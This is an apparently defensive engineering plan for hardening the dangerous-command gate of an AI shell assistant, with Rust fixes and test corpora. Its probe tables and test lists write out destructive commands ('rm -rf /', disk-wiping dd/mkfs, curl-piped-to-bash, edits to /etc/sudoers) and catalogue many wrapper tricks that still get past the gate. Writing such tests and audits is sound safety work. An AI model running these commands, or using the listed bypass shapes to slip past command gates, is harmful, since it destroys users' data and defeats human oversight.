# aishe — Audit Fixes Plan (post-v0.2.24 security & correctness pass)

**Source:** multi-agent audit of `main` @ `a80c49f` (v0.2.24), 9 dimensions ×
3-lens adversarial verification. 50 findings survived; the 5 highest
severity×likelihood×fix-cost are actioned here.

**Owner:** implementation is executed by an orchestrated agent workflow ("ultracode").
Each checklist item has a machine-verifiable acceptance criterion. **No item is
marked `[x]` until its acceptance command has been run and its output confirms it.**

---

## Plan review corrections (2026-07-27)

Tasks 1–5 were implemented, then the plan itself was reviewed against the shipped
code and probed empirically (`assess()` run over the edge cases below). The review
found **five defects in this plan**; the implementation faithfully followed the plan,
so the defects are live in the code. Probe results on the as-shipped tree:

| Probe | Result | Verdict |
|---|---|---|
| `fish -c 'rm -rf /'` | **safe** | ✗ plan omitted `fish` from the `-c` shell list |
| `bash -lc 'rm -rf /'` | **safe** | ✗ plan ignored combined short flags |
| `sh -ec 'rm -rf /'` | **safe** | ✗ same |
| `xargs -p rm -rf /` | **safe** | ✗ lowercase `-p`/`-P` collision swallows the wrapped command |
| `bash -x -c 'rm -rf /'` | DANGEROUS | ✓ separated flags fine |
| `xargs -P 4 rm -rf /` | DANGEROUS | ✓ |
| `find . \| xargs -I{} rm -rf /etc` | DANGEROUS | ✓ |
| `bash -c 'rm -rf /'`, `/bin/rm -rf /`, `rm -r /etc` | DANGEROUS | ✓ Tasks 1–3 core intact |

Corrections are folded into Tasks 2/3/4 below as items **T2.5, T3.8–T3.10, T4.9**.
Accepted (not fixed): non-shell interpreters (`python -c`, `perl -e`, `node -e`)
stay unassessed — Task 3 is deliberately scoped to shells; recursing into arbitrary
language payloads needs real parsing, not pattern work. Documented in Task 3.

## Ground rules (apply to every task)

- **No new dependencies.** `Cargo.toml` today has only `ureq`, `regex`, `serde`,
  `dirs`, `anyhow`, `libc` (+ clap etc.). Reach for stdlib and existing helpers.
- **Reuse, don't reinvent.** Known reusable pieces:
  - `tests/safety_corpus.rs` — two arrays (`DANGEROUS`, `SAFE`) + two asserting
    tests (`dangerous_corpus_all_flagged`, `safe_corpus_none_flagged`). New safety
    coverage = new array entries. This is *the* regression net.
  - `src/modes/mod.rs` — `GateOutcome` + `confirm_dangerous(command, reason)`, the
    existing dangerous-command confirmation prompt.
  - `src/trust.rs` — `is_trusted(path, content)` / `trust(path, content)`.
  - `src/safety.rs` — `unquote()`, `is_dangerous_path()`, `HEREDOC_SHELLS`.
- **Line numbers are as-of v0.2.24 and will drift.** Reference functions by name.
- **Mark deliberate shortcuts** with a `// ponytail:` comment naming the ceiling.
- **Leave the tree green.** `cargo build` + the task's tests must pass before the
  task is considered implemented. Do **not** `git commit` — the human handles that.

---

## Task 1 · Canonicalize the command head in the safety gate (finding #1, CRITICAL)

### Problem
`/bin/rm -rf /`, `\rm -rf /`, `sudo /bin/rm -rf /etc`, `/sbin/mkfs.ext4 /dev/sda`,
`/bin/dd if=/dev/zero of=/dev/sda`, `/sbin/reboot`, `env /bin/rm -rf /etc` all
classify as **Safe** and execute with no prompt (auto mode `eval "$cmd"`; yolo
`needs_confirm → (false,false)`).

### Root cause
The gate matches the *literal* first token. Path-aware checks
(`rm_recursive_force_risk`, `move_out_of_tree_risk`, `recursive_perms_risk`,
`truncate_out_of_tree_risk`, `dd_out_of_tree_risk`) all do
`let head = tokens.next()?; … if head != "rm"`. The `PATTERNS` regexes anchor with
`const CMD = r"^(sudo\s+)?"` then a literal name (`rm`, `dd\b`, `mkfs`, `reboot\b`).
Nothing strips a directory prefix (`/bin/`), a backslash alias-dodge (`\rm`), or
quotes (`"rm"`) from the head. `strip_prefixes` handles `sudo`/`env`/`FOO=bar` but
not the head's own form.

### Reasoning / approach
Fix once at the narrowest choke point: in `assess`, after
`strip_prefixes(unwrap_subshell(&segment))`, rewrite the segment's **first token**
to its canonical basename before any check runs. Then every path-check (they
re-tokenize `seg`) and every anchored regex sees `rm`/`dd`/`mkfs`. One transform,
five-plus call sites fixed, no per-check edits.

Canonicalization = unquote → strip backslashes → take the component after the last
`/`. Keep the rest of the segment byte-for-byte.

```rust
// ponytail: basename-only canonicalization of the command head; enough to defeat
// path/quote/backslash dodges. Full shell alias resolution is out of scope.
fn canonical_head(seg: &str) -> String {
    let mut it = seg.splitn(2, char::is_whitespace);
    let head = it.next().unwrap_or("");
    let rest = it.next();
    let name = unquote(head).replace('\\', "");
    let base = name.rsplit('/').next().unwrap_or("").to_string();
    match rest {
        Some(r) => format!("{base} {r}"),
        None => base,
    }
}
```

Applied as: `let seg = canonical_head(stripped.trim());` (bind to owned String).

### Example (must hold after the fix)
| Input | Before | After |
|---|---|---|
| `/bin/rm -rf /` | Safe | Dangerous |
| `\rm -rf /` | Safe | Dangerous |
| `sudo /bin/rm -rf /etc` | Safe | Dangerous |
| `/sbin/mkfs.ext4 /dev/sda` | Safe | Dangerous |
| `/bin/dd if=/dev/zero of=/dev/sda` | Safe | Dangerous |
| `/sbin/reboot` | Safe | Dangerous |
| `./scripts/deploy.sh` | Safe | **Safe** (no regression — basename `deploy.sh` matches nothing) |
| `rm -rf node_modules` | Safe | **Safe** (in-tree relative target still allowed) |

### Files
- `src/safety.rs` (add `canonical_head`, call it in `assess` loop)
- `tests/safety_corpus.rs` (add coverage)

### Implementation checklist
- [ ] `T1.1` Add `canonical_head()` helper to `src/safety.rs`.
- [ ] `T1.2` Apply it in the `assess` loop so downstream checks see the basename.
- [ ] `T1.3` `// ponytail:` comment names the basename-only ceiling.

### Tests
- [ ] `T1.4` Add to `DANGEROUS` in `tests/safety_corpus.rs`: `"/bin/rm -rf /"`,
  `"\\rm -rf /"`, `"sudo /bin/rm -rf /etc"`, `"/sbin/mkfs.ext4 /dev/sda"`,
  `"/bin/dd if=/dev/zero of=/dev/sda"`, `"/sbin/reboot"`, `"env /bin/rm -rf /etc"`.
- [ ] `T1.5` Add to `SAFE`: `"./scripts/deploy.sh"`, `"/usr/bin/git status"`,
  `"rm -rf node_modules"` (guard against over-flagging).

### Acceptance
`cargo test --test safety_corpus` passes with the new entries.

---

## Task 2 · `rm -r <system path>` without `-f` must be Dangerous (finding #2, HIGH)

### Problem
`rm -r /etc`, `rm -R /var`, `rm --recursive /srv`, `rm -r ~/Documents` classify as
**Safe**. `-r` alone is fully recursive; `-f` only suppresses per-file prompts, and
in auto/yolo/`-c` there is no tty to prompt anyway.

### Root cause
`rm_recursive_force_risk` bails with `if !(recursive && force) { return None; }` —
force is treated as a required trigger. The only fallback (anchored regex line 37)
requires the target to be exactly `/`, `~`, or `$HOME`.

### Reasoning / approach
Recursion is the danger signal; force is not. Gate the path check on `recursive`
alone. Keep `force` only for the no-target branch (`rm -rf` with no operand could
glob-expand; `rm -r` with no operand is just a usage error → leave Safe).

```rust
if !recursive {
    return None;
}
let cleaned: Vec<String> = targets.iter().map(|t| unquote(t)).collect();
if cleaned.iter().all(|t| t.is_empty()) {
    // ponytail: bare `rm -rf` (no target) can glob-expand; bare `rm -r` is a usage error.
    return if force { Some("recursive force delete with no target") } else { None };
}
if cleaned.iter().any(|t| is_dangerous_path(t)) {
    return Some("recursive force delete of a system or out-of-tree path");
}
None
```

### Example (must hold)
| Input | Before | After |
|---|---|---|
| `rm -r /etc` | Safe | Dangerous |
| `rm -R /var` | Safe | Dangerous |
| `rm --recursive /srv` | Safe | Dangerous |
| `rm -r ~/Documents` | Safe | Dangerous |
| `rm -r node_modules` | Safe | **Safe** (in-tree) |
| `rm -r` (no target) | Safe | **Safe** (usage error) |

### Files
- `src/safety.rs` (`rm_recursive_force_risk`)
- `tests/safety_corpus.rs`

### Implementation checklist
- [ ] `T2.1` Change the guard to `if !recursive { return None; }`.
- [ ] `T2.2` No-target branch returns `Some(..)` only when `force`, else `None`.
- [ ] `T2.5` **(review correction)** The dangerous-path reason string still reads
  `"recursive force delete of a system or out-of-tree path"` but now fires for
  non-force `rm -r /etc`, so the message is wrong on screen. Change it to
  `"recursive delete of a system or out-of-tree path"` (drop "force"). This is a
  `&'static str` shown in the confirm prompt — check no test asserts the old text
  (`grep -rn "recursive force delete of" src/ tests/`).

### Tests
- [ ] `T2.3` Add to `DANGEROUS`: `"rm -r /etc"`, `"rm -R /var"`,
  `"rm --recursive /srv"`, `"rm -r ~/Documents"`, `"sudo rm -r /var/lib/x"`.
- [ ] `T2.4` Add to `SAFE`: `"rm -r node_modules"`, `"rm -r ./build dist"`,
  `"rm -r target"` (in-tree recursive stays allowed).

### Acceptance
`cargo test --test safety_corpus` passes; existing `rm -rf …` cases unaffected.

---

## Task 3 · Recurse into interpreter `-c`, `eval`, and `xargs` payloads (finding #5, HIGH)

### Problem
`bash -c 'rm -rf /'`, `sh -c 'rm -rf /etc'`, `sudo bash -c 'rm -rf /'`,
`eval 'rm -rf /'`, and `find / -print0 | xargs -0 rm -rf` all classify **Safe**.
Yolo's single `run_command` tool makes the model routinely wrap compound commands
in `bash -c`.

### Root cause
`strip_prefixes` has no arm for a shell head + `-c`, for `eval`, or for `xargs`,
and `assess` only recurses into here-doc bodies and `$()`/`` ` ``/`<()` bodies.
Quoted argument text is deliberately never re-assessed (to avoid false-positiving
`echo 'rm -rf /'`), so an interpreter's quoted payload is treated as inert data.
Inconsistent with here-doc handling, which already treats `bash <<EOF … EOF` as
executing.

### Reasoning / approach
Two independent, targeted moves:

1. **Interpreter `-c` / `eval` recursion.** In `assess`, after the head is
   canonicalized (Task 1), if the head is a `-c`-taking shell **or** `eval`,
   extract the code payload, unquote it, and `assess` it recursively; Dangerous if
   the inner assessment is. This only fires for real interpreters, so `echo`/`printf`
   with a quoted arg are untouched (no false positives).
   - Shell list for `-c`: `sh bash zsh ksh dash ash` — **exclude `ssh`** (its `-c`
     is a cipher flag, not code). Do **not** reuse `HEREDOC_SHELLS` verbatim.
   - `bash -c '<code>' [name [args...]]`: take everything after the `-c` token,
     join, unquote, recurse. `// ponytail:` over-assessing the trailing $0/args
     region is acceptable (conservative, rare).
   - `eval <code...>`: everything after `eval` is code.
2. **`xargs` wrapper.** Add an arm to `strip_prefixes` that consumes `xargs` and its
   options so the wrapped utility becomes the segment head. Arg-taking flags:
   `-I -a -E -n -L -P -s -d --max-args --max-procs --replace --delimiter`; no-arg
   flags (`-0 -r -t -p -x`) are skipped by the generic `-`-prefix loop.
   `// ponytail:` `-I{}` glued form handled as a single arg-taking flag.

### Example (must hold)
| Input | Before | After |
|---|---|---|
| `bash -c 'rm -rf /'` | Safe | Dangerous |
| `sh -c "rm -rf /etc"` | Safe | Dangerous |
| `sudo bash -c 'rm -rf /'` | Safe | Dangerous |
| `eval 'rm -rf /'` | Safe | Dangerous |
| `find / -print0 \| xargs -0 rm -rf` | Safe | Dangerous |
| `echo 'rm -rf /'` | Safe | **Safe** (no false positive) |
| `bash -c 'ls -la'` | Safe | **Safe** |
| `ssh host -c aes256 …` | Safe | **Safe** (ssh -c not treated as code) |

### Files
- `src/safety.rs` (`assess` recursion + `strip_prefixes` xargs arm; new `-c`-shell const)
- `tests/safety_corpus.rs`

### Implementation checklist
- [ ] `T3.1` Add a `-c`-taking-shells const (excludes `ssh`).
- [ ] `T3.2` In `assess`, recurse into the `-c` payload for those shells.
- [ ] `T3.3` In `assess`, recurse into the `eval` payload.
- [ ] `T3.4` Add an `xargs` arm to `strip_prefixes`.
- [ ] `T3.5` `// ponytail:` comments name the ceilings ($0/args region; `-I{}` glued form).

### Tests
- [ ] `T3.6` Add to `DANGEROUS`: `"bash -c 'rm -rf /'"`, `"sh -c \"rm -rf /etc\""`,
  `"sudo bash -c 'rm -rf /'"`, `"eval 'rm -rf /'"`,
  `"find / -print0 | xargs -0 rm -rf"`, `"xargs rm -rf < list"` (best-effort).
- [ ] `T3.7` Add to `SAFE`: `"echo 'rm -rf /'"`, `"bash -c 'ls -la'"`,
  `"printf 'rm -rf /'"`, `"grep -c pattern file"` (a `-c` that is not a shell).

#### Review corrections (verified bypasses — all currently classify **Safe**)

- [ ] `T3.8` **Add `fish` to the `-c` shell list.** `fish -c 'rm -rf /'` → safe today.
  `fish` is already in `HEREDOC_SHELLS` and its `-c` executes code; the plan's
  original list (`sh bash zsh ksh dash ash`) simply dropped it. Excluding `ssh`
  remains correct (its `-c` is a cipher flag).
- [ ] `T3.9` **Handle combined short flags before `c`.** `bash -lc 'rm -rf /'` and
  `sh -ec 'rm -rf /'` → safe today, because `interpreter_payload` looks for an
  exact `-c` token. `bash -lc` is a very common LLM/CI idiom. Accept a
  single-dash cluster whose **last** letter is `c` (`-lc`, `-ec`, `-xc`), taking
  the payload as the following token(s). Do **not** match a cluster where `c`
  is not last (e.g. `-cx` would consume a different operand) unless trivially safe.
  `bash -x -c '…'` (separated) already works — keep it working.
- [ ] `T3.10` **Fix the `xargs -p` collision.** `xargs -p rm -rf /` → safe today.
  `normalize` lowercases the segment, so `-P` (`--max-procs`, takes an argument)
  and `-p` (`--interactive`, takes none) become the same token; listing `-p` as
  arg-taking makes `skip_opts` swallow the wrapped `rm`, leaving `-rf /` as the
  head. Prefer correctness on the dangerous side: treat lowercase `-p` as
  **not** arg-taking, and accept that `xargs -P 4 …` leaves a bare `4` head
  (harmless — `4` matches no pattern). Verify **both** `xargs -p rm -rf /` and
  `xargs -P 4 rm -rf /` end up Dangerous.
- [ ] `T3.11` Add all of the above to `DANGEROUS` in `tests/safety_corpus.rs`:
  `"fish -c 'rm -rf /'"`, `"bash -lc 'rm -rf /'"`, `"sh -ec 'rm -rf /'"`,
  `"bash -x -c 'rm -rf /'"`, `"xargs -p rm -rf /"`, `"xargs -P 4 rm -rf /"`.
- [ ] `T3.12` Add to `SAFE` as false-positive guards: `"fish -c 'ls -la'"`,
  `"bash -lc 'git status'"`, `"xargs -p rm build/tmp"`.
- [ ] `T3.13` Document the accepted limitation with a `// ponytail:` comment near
  `DASH_C_SHELLS`: non-shell interpreters (`python -c`, `perl -e`, `node -e`) are
  **not** recursed into — out of scope, needs real parsing.

### Acceptance
`cargo test --test safety_corpus` passes; the `echo 'rm -rf /'` false-positive
guard in `SAFE` still holds.

---

## Task 4 · Gate custom-command shell execution (finding #3, CRITICAL — verified RCE)

### Problem
A cloned repo's `<cwd>/.aishe/commands/deploy.md` with `shell: true` executes its
body via `executor.run(&ex.text)` (`main.rs:try_custom_command`) with **no**
`trust::is_trusted` check, **no** `safety::assess`, and **no** confirmation.
Reproduced: `cd evilrepo && aishe -c "/deploy"` ran arbitrary shell, exit 0, silent.
Project commands also silently shadow same-named user commands (`insert` overwrites,
project dir loaded second).

### Root cause
`command_dirs()` unconditionally appends `<cwd>/.aishe/commands`; `load_dir` doesn't
record a command's origin; `try_custom_command` runs `shell:true` bodies with no gate.

### Reasoning / approach
The trust model already exists for `.aishe/config.toml` (`src/trust.rs`) and the
danger-confirm prompt already exists (`modes::confirm_dangerous`). Wire the custom-
command path into both:

1. **Track origin.** Add `origin` to `CustomCommand` — enough to answer "did this
   come from a project dir, and what file?". Simplest: `source: Option<PathBuf>`
   (Some(path) for project commands, None for user commands), set in `load_dir`
   (pass an `is_project` flag or compare against the project dir).
2. **Gate execution.** In `try_custom_command`, before `executor.run(&ex.text)` when
   `ex.shell` **and** the command is project-origin:
   - Run `safety::assess(&ex.text)`; if Dangerous, go through `confirm_dangerous`
     (abort on non-confirm) — same gate as any other command.
   - Require the command file to be **trusted** (`trust::is_trusted(path, contents)`)
     **or** show the resolved shell command and require an explicit `y/N` before
     running. `// ponytail:` prompt-per-run is the floor; `aishe trust` upgrades it
     to trust-once.
   - User-origin `shell:true` commands keep running as before (the user authored
     them) but still pass through `safety::assess` for parity.
3. **Stop silent shadowing.** When a project command would overwrite a same-named
   user command, don't silently replace it: either keep the user's (use
   `or_insert`) or require confirmation. `// ponytail:` `or_insert` (user wins) is
   the lazy safe default; note it in CHANGELOG so the documented "project overrides"
   behavior change is intentional.

### Example (must hold)
- `cd evilrepo && aishe -c "/deploy"` where `deploy.md` is `shell:true` →
  **does not execute** without an explicit trust/confirm; the resolved command is
  shown first. A `dangerous` body additionally hits `confirm_dangerous`.
- A user's own `~/.config/aishe/commands/ll.md` (`shell:true`, `ls -lah`) still runs
  without friction (user origin), still assessed Safe.

### Files
- `src/commands.rs` (`CustomCommand.origin`, `load_dir`, `command_dirs`)
- `src/main.rs` (`try_custom_command` gating)

### Implementation checklist
- [ ] `T4.1` Add origin tracking to `CustomCommand` + set it in `load_dir`.
- [ ] `T4.2` Project-origin `shell:true`/`mode:yolo` requires trust **or** an
  explicit y/N showing the resolved command, before `executor.run`.
- [ ] `T4.3` Route the resolved shell body through `safety::assess` +
  `confirm_dangerous` (both origins).
- [ ] `T4.4` Project commands no longer silently overwrite same-named user commands
  (`or_insert` or confirm); documented in CHANGELOG.
- [ ] `T4.5` `// ponytail:` comment names the prompt-per-run floor.

### Tests
- [ ] `T4.6` Unit test in `src/commands.rs`: a project-origin `shell:true` command is
  tagged as such (origin is `Some`), a user-origin one is `None`.
- [ ] `T4.7` Unit test: a project command does not overwrite a same-named user
  command in the registry.
- [ ] `T4.8` (If a PTY/integration harness slot fits) a scripted `/deploy` in a temp
  repo with an untrusted `shell:true` command does not auto-execute. Otherwise cover
  the decision logic with a pure unit test on the gate function.
- [ ] `T4.9` **(review correction)** T4.4 reversed the documented precedence, but
  **five** places still tell users "project overrides user" and now contradict
  shipped behavior. Update all of them to state that a **user** command wins and a
  project command cannot shadow it:
  - `src/commands.rs:6` — module doc: ``(project — overrides user by name)``
  - `src/commands.rs:84` — ``/// Load from the user and project command directories (project overrides).``
  - `README.md:244` — "(project, overrides user)"
  - `docs/custom-commands-and-skills.md:76` — "Locations (project overrides user):"
  - `docs/development.md:50` — "project over user override precedence."

  Acceptance: `grep -rn "overrides user\|project overrides" src/ docs/ README.md`
  returns no stale claim (the CHANGELOG entry describing the *change* may remain).

### Acceptance
`cargo test` (commands unit tests) passes; manual/scripted repro
`cd <temp evilrepo> && aishe -c "/deploy"` no longer runs the body unprompted.

---

## Task 5 · Byte-oriented pipe drainer — stop truncating/hanging on non-UTF-8 (finding #4, CRITICAL)

### Problem
`spawn_drainer` (`src/executor.rs`) reads with
`for line in buf.lines().map_while(Result::ok)`. `BufRead::lines()` yields
`Err(InvalidData)` on any non-UTF-8 line, and `map_while(Result::ok)` **terminates**
the whole iteration on the first `Err` (it does not skip). One stray byte kills the
drainer thread: subsequent output is dropped from `collected` with no marker, and
nothing drains the pipe — once the ~64KB pipe buffer fills, the child blocks in
`write(2)` forever, `try_wait` never sees exit, `DEFAULT_CAPTURE_TIMEOUT` (120s)
elapses, the process group is SIGKILLed, and a **fabricated** "timed out" is
reported. Trigger: `grep -r TODO .` in any tree containing a binary file. `fix.rs`
inherits this via `executor.run`, so fixing the drainer fixes both.

### Root cause
`.lines()` is UTF-8-only and `map_while(Result::ok)` treats a decode error as
end-of-stream.

### Reasoning / approach
Drain bytes, decode lossily per line, so a decode error can neither end the stream
nor drop content:

```rust
let mut buf = BufReader::new(reader);
let mut raw = Vec::new();
loop {
    raw.clear();
    match buf.read_until(b'\n', &mut raw) {
        Ok(0) => break,                     // EOF
        Ok(_) => {}
        Err(_) => break,                    // pipe closed / real IO error
    }
    while matches!(raw.last(), Some(b'\n' | b'\r')) { raw.pop(); }
    let line = String::from_utf8_lossy(&raw).into_owned();
    // …tee + collect exactly as before…
}
```

`from_utf8_lossy` maps invalid bytes to U+FFFD — output is preserved, the thread
keeps draining, the pipe never wedges.

### Example (must hold)
- A child emitting `ok\n<0xFF byte>\nmore\n` yields `collected == ["ok", "\u{FFFD}",
  "more"]` — nothing dropped, no hang.
- `grep -r TODO .` over a tree with a binary file completes and returns full output.

### Files
- `src/executor.rs` (`spawn_drainer`)

### Implementation checklist
- [ ] `T5.1` Replace `lines()/map_while` with a `read_until` byte drain +
  `from_utf8_lossy`, preserving the existing tee (stdout/stderr) and collect logic.
- [ ] `T5.2` Trailing `\n`/`\r` stripped so collected lines match prior formatting.

### Tests
- [ ] `T5.3` Unit test in `src/executor.rs`: feed a reader whose bytes include an
  invalid UTF-8 sequence between two valid lines; assert all three lines land in
  `collected` (last one replaced with U+FFFD), i.e. no early termination.

### Acceptance
`cargo test` (executor unit test) passes; the drainer test proves non-UTF-8 does not
truncate.

---

## Cross-cutting validation gate (run once, after all five tasks)

- [ ] `V1` `cargo fmt --all -- --check` clean.
- [ ] `V2` `cargo clippy --all-targets -- -D warnings` clean.
- [ ] `V3` `cargo build --release` succeeds.
- [ ] `V4` `cargo test` — full suite green (unit + `safety_corpus` + `safety` +
  integration). Record pass count.
- [ ] `V5` PTY suite unaffected: `tests/pty_smoke.py` / `pty_scenarios.py` still pass
  (or explicitly noted as not-run with reason if the environment can't host them).
- [ ] `V6` No new dependency added to `Cargo.toml` / `Cargo.lock`.
- [ ] `V7` CHANGELOG.md entry summarizing the five fixes (and the project-command
  override behavior change from T4.4).
- [ ] `V8` Completeness check: every `[ ]` above is `[x]` with its acceptance
  command actually run — no box flipped without evidence.

---

## Task 6 · Fixed-point head resolution (audit-verify fallout, CRITICAL)

### Verdict that produced this task
After Tasks 1–5 + corrections, an adversarial bypass hunt attacked each original audit
finding. **0 of 5 findings were genuinely fixed**; 28 same-root-cause bypasses survived.
Independently re-verified — **16/19 probes still classify Safe**:

```
/usr/bin/env rm -rf /            SAFE      \command /bin/rm -rf /        SAFE
/usr/bin/sudo /bin/rm -rf /      SAFE      bash -cx 'rm -rf /'           SAFE
sudo /usr/bin/env rm -rf /etc    SAFE      bash -c -- 'rm -rf /'         SAFE
/usr/bin/xargs /bin/rm -rf /     SAFE      su -c 'rm -rf /'              SAFE
/usr/bin/env bash -c 'rm -rf /'  SAFE      bash <<< 'rm -rf /'           SAFE
/usr/bin/env /sbin/reboot        SAFE      rm --recu /etc                SAFE
parallel rm -rf /                SAFE      fish --command 'rm -rf /'     SAFE
ls\nrm -rf /                     SAFE      for f in *; do rm -rf /; done SAFE
--- controls (still correctly caught) ---
/bin/rm -rf /  DANGEROUS   bash -c 'rm -rf /'  DANGEROUS   rm -r /etc  DANGEROUS
```

### Root cause (one defect, most of the family)
`assess` does `strip_prefixes(...)` **once**, then `canonical_head(...)` **once**, in that
order. `strip_prefixes` matches wrapper words by literal token, so `/usr/bin/env` is not
`env`: the strip loop hits `_ => break` at position 0 and stops permanently.
`canonical_head` then rewrites only that one token to `env` — too late, nothing re-strips.
Any path-qualified or backslash-escaped wrapper **anywhere in the prefix chain** disables
the rest of the gate.

### Approach
**Iterate strip + canonicalize to a fixed point** instead of once each:

```rust
// ponytail: loop until the head stops changing (bounded) — a single strip/canonicalize
// pass lets `/usr/bin/env rm -rf /` through, because the wrapper isn't the literal `env`.
let mut seg = stripped.trim().to_string();
for _ in 0..8 {                       // bound: no unbounded rewrite loop
    let next = strip_prefixes(&canonical_head(&seg));
    if next.trim() == seg { break; }
    seg = next.trim().to_string();
}
```

That one change closes the `/usr/bin/env`, `/usr/bin/sudo`, `sudo /usr/bin/env`,
`/usr/bin/xargs`, `/usr/bin/env bash -c`, `/usr/bin/env /sbin/reboot`, and `\command`
families together. The rest are separate, smaller gaps listed below.

### Implementation checklist
- [ ] `T6.1` Fixed-point strip+canonicalize loop in `assess` (bounded iterations).
- [ ] `T6.2` `is_dash_c_flag`: accept a cluster containing `c` anywhere (`-cx`, `-cl`,
  `-ce`), not only last. Verified: `bash -cx 'rm -rf /'` really does run the payload.
- [ ] `T6.3` `interpreter_payload`: skip leading flags/`--` after `-c` so
  `bash -c -x '…'`, `bash -c -- '…'`, `eval -- '…'` resolve to the real payload.
- [ ] `T6.4` Treat `su -c`, `runuser -c`, `busybox sh -c`, `script -c` as code-running
  interpreters (they execute the payload, often as root).
- [ ] `T6.5` Here-strings: `bash <<< 'rm -rf /'` executes — assess the operand.
- [ ] `T6.6` `rm` long-option **prefixes**: GNU getopt accepts any unambiguous prefix, so
  `--recu`/`--rec`/`--r` all mean `--recursive`. Match by prefix, not exact literal.
- [ ] `T6.7` Add exec wrappers to `strip_prefixes`: `parallel`, `watch`, `flock`,
  `stdbuf`, `chroot`, `script`. Fix `command`/`exec`/`nohup` to consume their own options
  (currently a bare `i += 1` leaves `-p`/`--` as the head).
- [ ] `T6.8` `xargs` long forms `--arg-file`, `--max-chars`, `--process-slot-var`;
  `fish --command`.
- [ ] `T6.9` Multi-line and compound statements: `ls\nrm -rf /` and
  `for f in *; do rm -rf /; done` are Safe today — split on newlines, and strip compound
  keywords (`do`, `then`, `else`, `{`, `!`) so the real head is reached.

### Tests
- [ ] `T6.10` Every probe in the verdict table above added to `DANGEROUS`.
- [ ] `T6.11` False-positive guards in `SAFE`: `/usr/bin/env node app.js`,
  `/usr/bin/env python3 -V`, `parallel gzip {} ::: *.log`, `rm --recu ./build`,
  `for f in *; do echo $f; done`, `bash -cx 'ls -la'`.

### Acceptance
`cargo +1.93.0 test --test safety_corpus --test safety` green, **and** a probe over the
16 listed bypasses reports 0 remaining Safe.

---

## FINAL STATE (2026-07-27, end of work)

Direction chosen after round 3: **fail closed + fix false positives** (not "keep hardening
the denylist"). Delivered in rounds 4–6. Independently measured on the final tree:

| Metric | Before (v0.2.24) | After |
|---|---|---|
| Known bypasses caught | 0 / 23 | **23 / 23** |
| Everyday commands falsely flagged | 6 / 12 | **0 / 12** |
| Over-prompt rate (fresh 271-cmd corpus) | n/a | **0.37 %** |
| Unresolvable head | silently `Safe` | `Unknown` → confirms |
| Full suite | 11 environmental failures | **11 environmental failures**, lib 239 → 271 |
| Regression corpus | 200 lines | **822 lines** (`tests/safety_corpus.rs`) |

Closed after the direction was chosen: Tier 1 (comment-aware here-doc detection,
trailing-comment quote leak, redirect targets anywhere, `ssh [opts] host <cmd>`,
`trap`/`alias`/`watch` code args), Tier 2 (pipe-into-shell, non-shell interpreter payloads,
a deliberately-capped runner table), the 4 adjacent findings (skills shadowing, bounded
capture, non-UTF-8-safe MCP/SSE readers, dispatcher concurrent drain), and the docs.

`Risk::Unknown` is the structural change: when the gate cannot resolve a segment's head to a
command name it now says so and confirms, instead of silently returning `Safe`.

### Still NOT caught — measured, not theoretical

```
uv run rm -rf /                                safe      docker exec -it c rm -rf /     safe
ssh host 'rm -rf /'                            safe      trap 'rm -rf /' EXIT           safe
echo 'rm -rf /' | bash                         safe      cat x # <<EOF\nrm -rf /\nEOF   safe
python3 -c "import os;os.system('rm -rf /')"   safe      ls # don't\nrm -rf /           safe
bash -c "$(curl -fsSL https://x.sh)"           unknown   sudo tee /etc/sudoers <<EOF    safe
```

These are **inherent to the approach**, not an oversight: each needs the gate to know what a
runner binary will exec, what a remote host will run, or what a Python string will do. The
two `#`-comment cases are pre-existing (comment-blind here-doc/quote handling) and are the
best candidates for a further cheap fix.

**The gate is a heuristic speed bump, not a boundary. The sandbox (bwrap/overlay dry-run) is
the real control.** Any doc implying otherwise should be softened.

---

## STOP — the denylist does not converge (round-3 conclusion)

Task 6 **succeeded at what it was asked to do**: all 16 known bypasses closed, 0 false
positives introduced, 246 lib tests green, fmt/clippy/release clean, no new deps. Then a
fresh 4-lens hunt on the hardened gate found **50 new bypasses (23 plausible high/critical)
and 24 false positives**. Independently re-verified on the current tree:

```
MUST be Dangerous (attacks)                          MUST be Safe (everyday commands)
bash -c "$(curl -fsSL https://x.sh)"   SAFE ✗        rm -rf "$PWD/build"        DANGEROUS ✗
ssh host 'rm -rf /'                    SAFE ✗        mv /tmp/download.zip .     DANGEROUS ✗
MSG='hello world' rm -rf /             SAFE ✗        chown -R $USER ~/.npm      DANGEROUS ✗
uv run rm -rf /                        SAFE ✗        chmod -R 755 ~/bin         DANGEROUS ✗
watch -n 5 rm -rf /tmp/cache           SAFE ✗        dd if=/dev/zero of=/tmp/f  DANGEROUS ✗
echo 'rm -rf /' | bash                 SAFE ✗        mv dist/app.tgz /tmp/      DANGEROUS ✗
(cd /var/log && rm -rf *)              SAFE ✗
sudo rm /etc/shadow                    SAFE ✗        missed_attacks:    10/10
> /etc/passwd                          SAFE ✗        false_positives:    6/6
trap 'rm -rf /' EXIT                   SAFE ✗
```

**Measured against baseline (`git stash` → same probe → identical 10/10 and 6/6): every one
of these predates this branch.** This work did not regress the gate — it closed 16 bypasses
net — but it also did not, and by this method cannot, make it sound.

### The structural verdict

Three hardening rounds produced: 28 bypasses → 16 → 50. Each round closes the enumerated
cases and exposes a new frontier, because the gate is a **denylist of command names and
wrapper words matched by regex over a normalized string**, and the space of ways to spell
"run this command" in a shell is unbounded (wrappers, runners, interpreters, substitutions,
redirects, traps, functions, remote execution).

Worse, it fails on **both** axes at once: it misses every attack shape a model would
realistically emit, while flagging `chown -R $USER ~/.npm` — the exact remedy npm documents
for EACCES. A gate that is simultaneously bypassable and obstructive trains users to
confirm reflexively, which removes what protection it had.

The two failure modes share one cause: **the gate guesses at shell semantics with string
patterns instead of parsing.** `$PWD/build` "looks dangerous" (starts with `$`) while
`uv run rm -rf /` "looks safe" (head is `uv`). Both readings are wrong for the same reason.

### Recommended direction (needs a human decision — see the summary)

1. **Fail closed on unresolved heads.** Today an unrecognized head ⇒ `Safe`. It should mean
   *unknown*, and unknown in `auto`/`yolo` should confirm. This inverts the default that
   makes every new wrapper a silent bypass, and is a small change.
2. **Parse, don't pattern-match.** Tokenize properly (a real shell grammar) so heads,
   payloads, redirects, and compound bodies are resolved structurally.
3. **Rely on the sandbox as the actual control.** `bwrap`/overlay dry-run is a real boundary;
   the gate is a heuristic speed bump. Docs should stop implying the gate is the guarantee —
   README currently says "the model never gets to decide what executes."
4. **Fix the false positives** (`$PWD`, `$USER`, `~/…`, `/tmp/…` targets) regardless of path —
   they are a live usability defect, independent of the security question.

---

## Out of scope — new findings surfaced by the hunt (NOT actioned here)

Real, verified, but distinct from the original 5 findings. Recorded for a follow-up pass:

